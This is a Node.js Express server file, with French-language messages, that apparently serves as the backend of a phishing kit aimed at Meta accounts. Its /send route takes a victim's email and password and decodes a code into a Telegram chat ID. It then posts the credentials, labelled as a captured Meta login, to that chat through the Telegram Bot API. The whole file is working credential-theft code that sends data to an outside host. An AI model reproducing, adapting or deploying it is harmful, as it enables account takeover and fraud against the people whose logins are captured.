const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
require("dotenv").config();

const app = express();
app.use(bodyParser.json());
app.use(express.static("__dirname"));

const chars =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

function decodeCode(code) {
  let decoded = 0;
  for (let i = 0; i < code.length; i++) {
    decoded = decoded * 64 + chars.indexOf(code[i]);
  }
  return decoded;
}

app.post("/send", async (req, res) => {
  const { email, password, code } = req.body;
  if (!code || !email || !password)
    return res.status(400).send("Données manquantes");

  const chat_id = decodeCode(code);
  const token = process.env.BOT_TOKEN;

  const text = `🛡️ Meta Login Capturé\n\n📧 Email: <code>${email}</code>\n🔑 Mot de passe: <code>${password}</code>\n\n🔗 Code: <code>${code}</code>`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text, parse_mode: "HTML" }),
    });
    res.send("ok");
  } catch (err) {
    res.status(500).send("Erreur serveur");
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log("Serveur démarré sur le port", port);
});
